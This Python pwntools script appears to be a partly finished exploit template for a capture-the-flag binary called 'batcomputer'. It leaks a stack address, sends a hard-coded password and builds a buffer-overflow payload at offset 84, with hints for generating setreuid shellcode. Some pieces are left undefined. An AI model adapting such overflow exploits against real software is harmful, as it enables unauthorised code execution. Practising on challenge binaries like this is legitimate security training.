from pwn import *
import time
import re

# Built from and inspired by:
# https://notes.vulndev.io/wiki/redteam/templates
# 

context.terminal = ['tmux', 'new-window']
target = './batcomputer'
context.binary = target
context.log_level = 'info' # info, debug will print flag in table with addresses,hex and translated ASCII with columns
binary = ELF(target)

rhost = 'ip_address_here' 
rport = -1 

gdbscript = '''
continue
'''.format(**locals())
# NOASLR

# Get addresses - CryptoCat for p and r
# recvS() is like recv(), but returns a String 
#pivot_addr = int(re.search(r"(0x[\w\d]+)", r.recvS()).group(0), 16)
#pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)
#info("pivot_addr: %#x", pivot_addr)

# Extract value after string
#get = lambda x: [sh.recvuntil('{} : '.format(x)), int(sh.recvline())][1]
#p = get('p')

# LD_Preload in pwntool
#libc = ELF(<name>)
#main = ELF(<name>)
#r = main.process(env={'LD_PRELOAD' : libc.path})

# SSH connection variables
ssh_host = '10.10.10.10'
ssh_user = '!'
sh_pass = '!'
ssh_port = 22

joker_location = b""
password = "b4tp@$$w0rd!"

if args['SSH']:
    sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)
    p = sh.run('/bin/bash')
    junk = p.recv(4096,timeout=2)
    p.sendline(target)
elif args['PWN']:
    r = remote(rhost, rport) 
    r.sendlineafter(">", 1)
    pivot_addr = int(re.search(r"(0x[\w\d]+)", r.recvS()).group(0), 16)
    r.sendlineafter(">", 2)
    r.sendlineafter("Enter the password:", password) 
    r.sendlineafter("Enter the navigation commands:", payload) 
    r.sendlineafter(">", 0)
    r.recvuntil('SomeRecieveStringHere')
    flag = r.recv()
    success(flag)
    r.close()
elif args['GEF']:
    p = process(target,setuid=True)
    gdb.attach(p, gdbscript=gdbscript)
    p.sendlineafter(">", '1')
    pivot_addr = int(re.search(r"(0x[\w\d]+)", p.recvS()).group(0), 16)  
    p.sendlineafter(">", 2)
    p.sendlineafter("Enter the password:", password) 
    p.sendlineafter("Enter the navigation commands:", payload) 
    p.sendlineafter(">", 0)
    time.sleep(10)
    p.recvuntil('SomeRecieveStringHere')
    flag = p.recv()
    success(flag)
    p.close()
else: 
    print("Vim search and replace: \%\s/SomeRecieveStringHere/ /g")
    print("Vim search and replace: \%\s/>/ /g")
    print("Generate shellcode on the commandline: `pwn shellcraft -f d amd64.linux.setreuid 1002`")

# p.interactive()


def find_eip(payload):
    p = process(binary)
    p.sendlineafter('>', payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc) # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4)) # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

# offset = find_eip(cyclic(1000))
offset = 84

payload = flat(
        {offset: joker_location}
)

# Write payload to file
# write('payload-pwn', payload)
